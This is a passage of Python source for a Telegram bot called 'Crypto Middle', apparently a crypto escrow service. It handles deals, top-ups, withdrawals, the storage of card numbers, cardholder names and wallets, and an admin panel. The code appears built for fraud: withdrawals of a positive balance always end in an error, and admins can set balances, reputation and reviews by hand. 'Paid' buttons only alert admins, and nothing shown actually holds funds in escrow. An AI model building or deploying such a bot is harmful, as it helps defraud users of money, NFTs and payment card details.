                                      [InlineKeyboardButton(text=L(uid,"btn_why_safe"), url=SAFETY_PAGE)],
                                      [InlineKeyboardButton(text=L(uid,"btn_back"), callback_data="menu")],
                                  ]))
    await callback.answer()

# ── deal flow ────────────────────────────────────────────────────────────────

@dp.callback_query(F.data == "deal")
async def cb_deal(callback: CallbackQuery):
    uid = callback.from_user.id
    await safe_del(callback.message)
    await callback.message.answer(L(uid,"agreement"), parse_mode="HTML",
                                  reply_markup=agreement_kb(uid))
    await callback.answer()

@dp.callback_query(F.data == "confirm_agreement")
async def cb_confirm(callback: CallbackQuery, state: FSMContext):
    uid = callback.from_user.id
    await safe_del(callback.message)
    await callback.message.answer(L(uid,"deal_step1"), parse_mode="HTML",
                                  reply_markup=cancel_kb(uid))
    await state.set_state(Deal.partner)
    await callback.answer()

@dp.message(Deal.partner)
async def deal_partner(message: Message, state: FSMContext):
    uid  = message.from_user.id
    reg(message)
    await safe_del(message)
    text = message.text.strip()
    if not text.startswith("@"):
        await message.answer(L(uid,"invalid_username"), parse_mode="HTML",
                             reply_markup=cancel_kb(uid))
        return
    await state.update_data(partner=text)
    await message.answer(L(uid,"deal_step2"), parse_mode="HTML",
                         reply_markup=cancel_kb(uid))
    await state.set_state(Deal.description)

@dp.message(Deal.description)
async def deal_desc(message: Message, state: FSMContext):
    uid = message.from_user.id
    reg(message)
    await safe_del(message)
    if len(message.text.strip()) < 8:
        await message.answer(L(uid,"deal_step2_short"), parse_mode="HTML",
                             reply_markup=cancel_kb(uid))
        return
    await state.update_data(description=message.text.strip())
    await message.answer(L(uid,"deal_step3"), parse_mode="HTML",
                         reply_markup=currency_kb(uid))
    await state.set_state(Deal.currency)

@dp.callback_query(F.data.startswith("deal_cur_"), Deal.currency)
async def deal_cur(callback: CallbackQuery, state: FSMContext):
    uid = callback.from_user.id
    cur_map = {
        "deal_cur_ton":   ("TON",        "ton_wallet",      "ton"),
        "deal_cur_stars": ("Stars",      "stars_username",  "stars"),
        "deal_cur_card":  ("Card (RUB)", "card_number",     "card"),
        "deal_cur_nft":   ("NFT",         None,              None),
    }
    cur_label, req_field, req_type = cur_map[callback.data]
    user = get_user(uid)

    if req_field and not user.get(req_field):
        await safe_del(callback.message)
        key = f"no_req_{req_type}"
        await callback.message.answer(L(uid, key), parse_mode="HTML",
                                      reply_markup=add_req_kb(uid, req_type))
        await state.clear()
        await callback.answer()
        return

    await state.update_data(currency=cur_label)
    await safe_del(callback.message)
    await callback.message.answer(L(uid,"deal_step4"), parse_mode="HTML",
                                  reply_markup=cancel_kb(uid))
    await state.set_state(Deal.amount)
    await callback.answer()

@dp.message(Deal.amount)
async def deal_amount(message: Message, state: FSMContext):
    uid  = message.from_user.id
    reg(message)
    await safe_del(message)
    data    = await state.get_data()
    deal_id = gen_deal_id()
    deals[deal_id] = {
        "uid":         uid,
        "partner":     data.get("partner", "-"),
        "description": data.get("description", "-"),
        "amount":      message.text.strip(),
        "currency":    data.get("currency", "?"),
        "status":      "active"
    }
    get_user(uid)["deals_count"] += 1

    me = await bot.get_me()
    await message.answer(
        L(uid, "deal_created",
          deal_id=deal_id,
          partner=data.get("partner","-"),
          description=data.get("description","-"),
          amount=message.text.strip(),
          currency=data.get("currency","?"),
          bot_username=me.username),
        parse_mode="HTML",
        reply_markup=deal_seller_kb(uid, deal_id)
    )

    uname = f"@{message.from_user.username}" if message.from_user.username else f"ID:{uid}"
    for adm in ADMIN_IDS:
        try:
            await bot.send_message(
                adm,
                f"<b>Новая сделка {deal_id}</b>\n\n"
                f"<b>Создатель: {uname} (ID:{uid})</b>\n"
                f"<b>Партнер: {data.get('partner','-')}</b>\n"
                f"<b>Суть: {data.get('description','-')}</b>\n"
                f"<b>Сумма: {message.text.strip()} {data.get('currency','?')}</b>",
                parse_mode="HTML"
            )
        except Exception:
            pass
    await state.clear()

# ── paid ─────────────────────────────────────────────────────────────────────

@dp.callback_query(F.data.startswith("paid_"))
async def cb_paid(callback: CallbackQuery):
    uid     = callback.from_user.id
    deal_id = callback.data.replace("paid_","")
    uname   = f"@{callback.from_user.username}" if callback.from_user.username else f"ID:{uid}"

    if deal_id == "topup":
        for adm in ADMIN_IDS:
            try:
                await bot.send_message(
                    adm,
                    f"<b>Пополнение баланса</b>\n\n<b>Пользователь: {uname} (ID:{uid})</b>",
                    parse_mode="HTML"
                )
            except Exception:
                pass
        await callback.answer("Уведомление отправлено!", show_alert=True)
        await callback.message.answer(L(uid,"paid_confirm"), parse_mode="HTML",
                                      reply_markup=back_kb(uid))
        return

    deal = deals.get(deal_id)
    if not deal:
        await callback.answer("Сделка не найдена", show_alert=True)
        return

    for adm in ADMIN_IDS:
        try:
            await bot.send_message(
                adm,
                L(adm, "paid_notify_admin",
                  deal_id=deal_id, user=uname,
                  amount=deal.get("amount","-"),
                  currency=deal.get("currency","-")),
                parse_mode="HTML"
            )
        except Exception:
            pass

    seller_uid = deal.get("uid")
    if seller_uid and seller_uid != uid:
        try:
            await bot.send_message(
                seller_uid,
                L(seller_uid, "paid_notify_seller", deal_id=deal_id),
                parse_mode="HTML"
            )
        except Exception:
            pass

    await callback.answer("Уведомление отправлено!", show_alert=True)
    await callback.message.answer(L(uid,"paid_confirm"), parse_mode="HTML",
                                  reply_markup=back_kb(uid))

# ── requisites ───────────────────────────────────────────────────────────────

@dp.callback_query(F.data.startswith("req_") & F.data.endswith("_deal"))
async def req_from_deal(callback: CallbackQuery, state: FSMContext):
    uid      = callback.from_user.id
    req_type = callback.data[4:-5]
    await safe_del(callback.message)
    state_map = {"ton": (AddReq.ton, "enter_ton"),
                 "card": (AddReq.card_num, "enter_card_num"),
                 "stars": (AddReq.stars, "enter_stars")}
    if req_type not in state_map:
        await callback.answer(); return
    st, key = state_map[req_type]
    await callback.message.answer(L(uid, key), parse_mode="HTML", reply_markup=cancel_kb(uid))
    await state.set_state(st)
    await state.update_data(from_deal=True)
    await callback.answer()

@dp.callback_query(F.data == "requisites")
async def cb_req(callback: CallbackQuery):
    uid = callback.from_user.id
    u   = get_user(uid)
    await safe_del(callback.message)
    await callback.message.answer(
        L(uid, "req_title",
          ton=u.get("ton_wallet") or "-",
          card=u.get("card_number") or "-",
          card_name=u.get("card_name") or "-",
          stars=u.get("stars_username") or "-"),
        parse_mode="HTML",
        reply_markup=req_kb(uid)
    )
    await callback.answer()

@dp.callback_query(F.data == "req_ton")
async def cb_req_ton(callback: CallbackQuery, state: FSMContext):
    uid = callback.from_user.id
    await safe_del(callback.message)
    await callback.message.answer(L(uid,"enter_ton"), parse_mode="HTML", reply_markup=cancel_kb(uid))
    await state.set_state(AddReq.ton)
    await callback.answer()

@dp.callback_query(F.data == "req_card")
async def cb_req_card(callback: CallbackQuery, state: FSMContext):
    uid = callback.from_user.id
    await safe_del(callback.message)
    await callback.message.answer(L(uid,"enter_card_num"), parse_mode="HTML", reply_markup=cancel_kb(uid))
    await state.set_state(AddReq.card_num)
    await callback.answer()

@dp.callback_query(F.data == "req_stars")
async def cb_req_stars(callback: CallbackQuery, state: FSMContext):
    uid = callback.from_user.id
    await safe_del(callback.message)
    await callback.message.answer(L(uid,"enter_stars"), parse_mode="HTML", reply_markup=cancel_kb(uid))
    await state.set_state(AddReq.stars)
    await callback.answer()

@dp.message(AddReq.ton)
async def save_ton(message: Message, state: FSMContext):
    uid = message.from_user.id
    reg(message)
    await safe_del(message)
    addr = message.text.strip()
    if not valid_ton(addr):
        await message.answer(L(uid,"req_ton_invalid"), parse_mode="HTML", reply_markup=cancel_kb(uid))
        return
    get_user(uid).update({"ton_wallet": addr, "has_requisites": True})
    data   = await state.get_data()
    suffix = L(uid,"redo_deal") if data.get("from_deal") else ""
    await state.clear()
    await message.answer(L(uid,"req_ton_saved") + suffix, parse_mode="HTML", reply_markup=main_kb(uid))

@dp.message(AddReq.card_num)
async def save_card_num(message: Message, state: FSMContext):
    uid = message.from_user.id
    reg(message)
    await safe_del(message)
    num = message.text.strip()
    if not valid_card(num):
        await message.answer(L(uid,"req_card_invalid"), parse_mode="HTML", reply_markup=cancel_kb(uid))
        return
    await state.update_data(card_number=num)
    await message.answer(L(uid,"req_card_num_saved"), parse_mode="HTML", reply_markup=cancel_kb(uid))
    await state.set_state(AddReq.card_name)

@dp.message(AddReq.card_name)
async def save_card_name(message: Message, state: FSMContext):
    uid = message.from_user.id
    reg(message)
    await safe_del(message)
    name = message.text.strip()
    data = await state.get_data()
    get_user(uid).update({
        "card_number": data.get("card_number",""),
        "card_name":   name,
        "has_requisites": True
    })
    suffix = L(uid,"redo_deal") if data.get("from_deal") else ""
    await state.clear()
    await message.answer(L(uid,"req_card_saved") + suffix, parse_mode="HTML", reply_markup=main_kb(uid))

@dp.message(AddReq.stars)
async def save_stars(message: Message, state: FSMContext):
    uid = message.from_user.id
    reg(message)
    await safe_del(message)
    uname = message.text.strip()
    if not uname.startswith("@"):
        uname = "@" + uname
    get_user(uid).update({"stars_username": uname, "has_requisites": True})
    data   = await state.get_data()
    suffix = L(uid,"redo_deal") if data.get("from_deal") else ""
    await state.clear()
    await message.answer(L(uid,"req_stars_saved") + suffix, parse_mode="HTML", reply_markup=main_kb(uid))

# ── top-up ───────────────────────────────────────────────────────────────────

@dp.callback_query(F.data == "topup")
async def cb_topup(callback: CallbackQuery):
    uid = callback.from_user.id
    await safe_del(callback.message)
    await callback.message.answer(L(uid,"topup_title"), parse_mode="HTML", reply_markup=topup_kb(uid))
    await callback.answer()

@dp.callback_query(F.data == "topup_stars")
async def cb_topup_stars(callback: CallbackQuery, state: FSMContext):
    uid = callback.from_user.id
    await safe_del(callback.message)
    await callback.message.answer(L(uid,"topup_enter_amount"), parse_mode="HTML", reply_markup=cancel_kb(uid))
    await state.set_state(TopUp.amount)
    await state.update_data(topup_method="stars")
    await callback.answer()

@dp.callback_query(F.data == "topup_ton")
async def cb_topup_ton(callback: CallbackQuery, state: FSMContext):
    uid = callback.from_user.id
    await safe_del(callback.message)
    await callback.message.answer(L(uid,"topup_enter_amount"), parse_mode="HTML", reply_markup=cancel_kb(uid))
    await state.set_state(TopUp.amount)
    await state.update_data(topup_method="ton")
    await callback.answer()

@dp.callback_query(F.data == "topup_card")
async def cb_topup_card(callback: CallbackQuery, state: FSMContext):
    uid = callback.from_user.id
    await safe_del(callback.message)
    await callback.message.answer(L(uid,"topup_enter_amount"), parse_mode="HTML", reply_markup=cancel_kb(uid))
    await state.set_state(TopUp.amount)
    await state.update_data(topup_method="card")
    await callback.answer()

@dp.callback_query(F.data == "topup_nft")
async def cb_topup_nft(callback: CallbackQuery):
    uid = callback.from_user.id
    await safe_del(callback.message)
    await callback.message.answer(L(uid,"topup_nft"), parse_mode="HTML", reply_markup=topup_paid_kb(uid))
    await callback.answer()

@dp.message(TopUp.amount)
async def topup_amount(message: Message, state: FSMContext):
    uid = message.from_user.id
    reg(message)
    await safe_del(message)
    raw = message.text.strip().replace(",",".")
    try:
        amount = float(raw)
        if amount <= 0: raise ValueError
    except ValueError:
        await message.answer(L(uid,"topup_amount_invalid"), parse_mode="HTML", reply_markup=cancel_kb(uid))
        return
    data   = await state.get_data()
    method = data.get("topup_method","ton")
    await state.clear()
    amt_str = str(int(amount)) if amount == int(amount) else str(amount)
    await message.answer(L(uid, f"topup_{method}", amount=amt_str),
                         parse_mode="HTML", reply_markup=topup_paid_kb(uid))

# ── withdraw ─────────────────────────────────────────────────────────────────

@dp.callback_query(F.data == "withdraw")
async def cb_withdraw(callback: CallbackQuery):
    uid     = callback.from_user.id
    balance = get_user(uid).get("balance", 0.0)
    await safe_del(callback.message)
    if balance <= 0:
        await callback.message.answer(
            L(uid,"withdraw_no_funds"), parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text=L(uid,"btn_topup"), callback_data="topup")],
                [InlineKeyboardButton(text=L(uid,"btn_back"),  callback_data="menu")],
            ])
        )
    else:
        await callback.message.answer(
            L(uid,"withdraw_error"), parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text=L(uid,"btn_support"),
                                      url=f"https://t.me/{SUPPORT_USERNAME.lstrip('@')}")],
                [InlineKeyboardButton(text=L(uid,"btn_back"), callback_data="menu")],
            ])
        )
    await callback.answer()

# ── admin ────────────────────────────────────────────────────────────────────

@dp.message(Command("adm"))
async def cmd_adm(message: Message):
    if message.from_user.id not in ADMIN_IDS: return
    total = len([k for k in user_data if not str(k).startswith("_")])
    await message.answer(
        f"<b>Админ-панель | Crypto Middle</b>\n\n"
        f"<b>Пользователей: {total}</b>\n"
        f"<b>Сделок: {len(deals)}</b>",
        parse_mode="HTML", reply_markup=admin_kb())

@dp.callback_query(F.data == "adm_banner")
async def adm_banner(callback: CallbackQuery, state: FSMContext):
    if callback.from_user.id not in ADMIN_IDS: return
    await safe_del(callback.message)
    await callback.message.answer(
        "<b>Отправьте фото + подпись для баннера.</b>\n"
        "<b>Баннер будет показываться везде при открытии меню.</b>",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Отмена", callback_data="adm_cancel")]
        ]))
    await state.set_state(SetBanner.waiting)
    await callback.answer()

@dp.message(SetBanner.waiting, F.photo)
async def save_banner(message: Message, state: FSMContext):
    if message.from_user.id not in ADMIN_IDS: return
    user_data["_banner"] = {"photo_id": message.photo[-1].file_id,
                            "caption":  message.caption or ""}
    await safe_del(message)
    await message.answer("<b>Баннер обновлен! Теперь он показывается во всех меню.</b>",
                         parse_mode="HTML", reply_markup=admin_kb())
    await state.clear()

@dp.callback_query(F.data == "adm_stats")
async def adm_stats(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS: return
    total    = len([k for k in user_data if not str(k).startswith("_")])
    with_req = len([v for k,v in user_data.items()
                    if not str(k).startswith("_") and isinstance(v,dict) and v.get("has_requisites")])
    active   = len([d for d in deals.values() if d.get("status")=="active"])
    total_turnover = sum(
        v.get("turnover", 0.0) for k, v in user_data.items()
        if not str(k).startswith("_") and isinstance(v, dict)
    )
    await callback.message.answer(
        f"<b>Статистика</b>\n\n"
        f"<b>Всего: {total}</b>\n"
        f"<b>С реквизитами: {with_req}</b>\n"
        f"<b>Сделок: {len(deals)}</b>\n"
        f"<b>Активных: {active}</b>\n"
        f"<b>Общий оборот: {total_turnover}$</b>",
        parse_mode="HTML")
    await callback.answer()

@dp.callback_query(F.data == "adm_users")
async def adm_users(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS: return
    ulist = [k for k in user_data if not str(k).startswith("_")]
    text  = f"<b>Пользователи ({len(ulist)})</b>\n\n"
    for uid in ulist[:20]:
        u = user_data[uid]
        if not isinstance(u,dict): continue
        text += (f"<b><code>{uid}</code> rep:{u.get('reputation',0)} "
                 f"deals:{u.get('deals_count',0)} "
                 f"bal:{u.get('balance',0.0)} "
                 f"{'req' if u.get('has_requisites') else 'no-req'} "
                 f"{u.get('lang','ru')}</b>\n")
    if len(ulist) > 20:
        text += f"<b>...еще {len(ulist)-20}</b>"
    await callback.message.answer(text, parse_mode="HTML")
    await callback.answer()

@dp.callback_query(F.data == "adm_reputation")
async def adm_rep(callback: CallbackQuery, state: FSMContext):
    if callback.from_user.id not in ADMIN_IDS: return
    await callback.message.answer(
        "<b>Репутация</b>\n\n<b>Формат: @username +5</b>",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Отмена", callback_data="adm_cancel")]
        ]))
    await state.set_state(AdminAction.reputation)
    await callback.answer()

@dp.message(AdminAction.reputation)
async def process_rep(message: Message, state: FSMContext):
    if message.from_user.id not in ADMIN_IDS: return
    try:
        parts = message.text.strip().split()
        uid   = find_uid(parts[0])
        if uid is None:
            await message.answer("<b>Пользователь не найден.</b>", parse_mode="HTML")
            await state.clear(); return
        delta = int(parts[1])
        user  = get_user(uid)
        user["reputation"] = user.get("reputation",0) + delta
        await message.answer(
            f"<b>Репутация <code>{uid}</code>: {delta:+}\nИтого: {user['reputation']}</b>",
            parse_mode="HTML")
        await bot.send_message(uid,
            f"<b>Ваша репутация изменена: {delta:+}\nТекущая: {user['reputation']}</b>",
            parse_mode="HTML")
    except Exception:
        await message.answer("<b>Ошибка. Формат: @username +5</b>", parse_mode="HTML")
    await state.clear()

@dp.callback_query(F.data == "adm_review")
async def adm_review(callback: CallbackQuery, state: FSMContext):
    if callback.from_user.id not in ADMIN_IDS: return
    await callback.message.answer(
        "<b>Отзыв</b>\n\n<b>Формат: @username Текст</b>",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Отмена", callback_data="adm_cancel")]
        ]))
    await state.set_state(AdminAction.review)
    await callback.answer()

@dp.message(AdminAction.review)
async def process_review(message: Message, state: FSMContext):
    if message.from_user.id not in ADMIN_IDS: return
    try:
        parts = message.text.strip().split(maxsplit=1)
        uid   = find_uid(parts[0])
        if uid is None:
            await message.answer("<b>Пользователь не найден.</b>", parse_mode="HTML")
            await state.clear(); return
        get_user(uid).setdefault("reviews",[]).append(parts[1])
        await message.answer(f"<b>Отзыв добавлен <code>{uid}</code></b>", parse_mode="HTML")
        await bot.send_message(uid, f"<b>Новый отзыв:</b>\n\n<b>{parts[1]}</b>", parse_mode="HTML")
    except Exception:
        await message.answer("<b>Ошибка.</b>", parse_mode="HTML")
    await state.clear()

@dp.callback_query(F.data == "adm_balance")
async def adm_bal(callback: CallbackQuery, state: FSMContext):
    if callback.from_user.id not in ADMIN_IDS: return
    await callback.message.answer(
        "<b>Баланс</b>\n\n<b>Формат: @username 150.5</b>",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Отмена", callback_data="adm_cancel")]
        ]))
    await state.set_state(AdminAction.balance)
    await callback.answer()

@dp.message(AdminAction.balance)
async def process_bal(message: Message, state: FSMContext):
    if message.from_user.id not in ADMIN_IDS: return
    try:
        parts  = message.text.strip().split()
        uid    = find_uid(parts[0])
        if uid is None:
            await message.answer("<b>Пользователь не найден.</b>", parse_mode="HTML")
            await state.clear(); return
        amount = float(parts[1])
        user   = get_user(uid)
        old    = user.get("balance",0)
        user["balance"] = amount
        await message.answer(
            f"<b>Баланс <code>{uid}</code>: {old} -> {amount}</b>", parse_mode="HTML")
        await bot.send_message(uid,
            f"<b>Ваш баланс обновлен: {amount}</b>", parse_mode="HTML")
    except Exception:
        await message.answer("<b>Ошибка.</b>", parse_mode="HTML")
    await state.clear()

@dp.callback_query(F.data == "adm_deals")
async def adm_deals_cb(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS: return
    if not deals:
        await callback.message.answer("<b>Сделок пока нет.</b>", parse_mode="HTML")
        await callback.answer(); return
    text = f"<b>Сделки ({len(deals)})</b>\n\n"
    for deal_id, d in list(deals.items())[-10:]:
        text += (f"<b><code>{deal_id}</code> | {d['uid']} | {d.get('partner','-')}</b>\n"
                 f"<b>{d['amount']} {d['currency']} | {d['description'][:25]}</b>\n"
                 f"<b>Статус: {d['status']}</b>\n\n")
    await callback.message.answer(text, parse_mode="HTML")
    await callback.answer()

@dp.callback_query(F.data == "adm_cancel")
async def adm_cancel(callback: CallbackQuery, state: FSMContext):
    await state.clear()
    await callback.message.answer("<b>Отменено.</b>", parse_mode="HTML", reply_markup=admin_kb())
    await callback.answer()

# ── run ──────────────────────────────────────────────────────────────────────

async def set_commands():
    await bot.set_my_commands([
        BotCommand(command="start", description="Главное меню / Main menu"),
    ])

async def main():
    await set_commands()
    print("Crypto Middle Bot запущен!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
